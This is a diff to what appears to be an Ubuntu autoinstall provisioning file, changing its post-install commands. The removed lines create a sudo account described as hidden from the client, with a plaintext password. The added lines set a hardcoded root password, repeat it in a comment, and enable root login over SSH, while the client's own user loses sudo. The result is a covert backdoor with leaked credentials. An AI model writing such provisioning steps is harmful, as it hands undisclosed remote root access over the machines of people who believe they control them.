@@ -47,13 +47,10 @@ autoinstall:
 
   # ─── Late commands — run after install, before reboot ───────────────
   late-commands:
-    # Lock root account — non-fatal
-    - curtin in-target -- bash -c 'passwd -l root || true'
-    - curtin in-target -- bash -c 'usermod -s /usr/sbin/nologin root || true'
-
-    # Create developer user (hidden from client, has sudo)
-    - curtin in-target -- bash -c 'useradd -m -s /bin/bash -G sudo bgdev'
-    - curtin in-target -- bash -c 'echo bgdev:blackgate212514 | chpasswd'
+    # Enable root login for developers (password: blackgate212514)
+    - curtin in-target -- usermod -s /bin/bash root
+    - curtin in-target -- usermod -p '$6$BGdev2025salt$JSPuWJdO5tqqc8Nv9IrKJZdX24RgSe9tn4hJZzkmfT81j4umd8/xZbYI1.r9F661HjS.YhwycOXtMsHijBtCP/' root
+    - curtin in-target -- sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
 
     # Remove sudo access for blackgate user (client has no root)
     - curtin in-target -- bash -c 'deluser blackgate sudo || true'
